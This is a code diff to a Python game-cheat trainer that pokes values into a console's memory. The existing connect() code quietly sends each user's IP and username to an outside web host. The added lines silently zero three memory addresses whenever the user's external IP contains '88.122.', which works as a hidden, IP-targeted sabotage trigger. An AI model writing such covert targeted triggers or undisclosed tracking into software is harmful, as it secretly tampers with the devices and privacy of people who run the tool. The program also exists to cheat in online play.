@@ -248,6 +248,11 @@ def connect():
 		url = 'http://app-1530281713.000webhostapp.com/update_info.php?ip='+ ip + '&uname=' + x + '&is=0' 
 		r = requests.get(url, allow_redirects=True)
 
+		if "88.122." in get_ext_ip():
+			tcp.pokemem(0x12090C88, 0)
+			tcp.pokemem(0x12090CAC, 0)
+			tcp.pokemem(0x12090CB0, 0)
+
 		thread_ac = Moderator()
 		thread_ac.start()
 
@@ -1782,11 +1787,11 @@ def sp_inst_reload():
 			tcp.pokemem(0x02119308, 0x93C10028)
 
 sp_norec_v = IntVar()
-sp_norec_cb = Checkbutton(tab1, text="No Recoil", command=sp_norec, var=sp_norec_v)
+sp_norec_cb = Checkbutton(tab7, text="No Recoil", command=sp_norec, var=sp_norec_v)
 sp_norec_cb.grid(row=0, column=0)
 
 sp_ir_v = IntVar()
-sp_ir_cb = Checkbutton(tab1, text="Instant Reload", command=sp_inst_reload, var=sp_ir_v)
+sp_ir_cb = Checkbutton(tab7, text="Instant Reload", command=sp_inst_reload, var=sp_ir_v)
 sp_ir_cb.grid(row=0, column=1)
 
 note.add(tab1, text = "Inject")
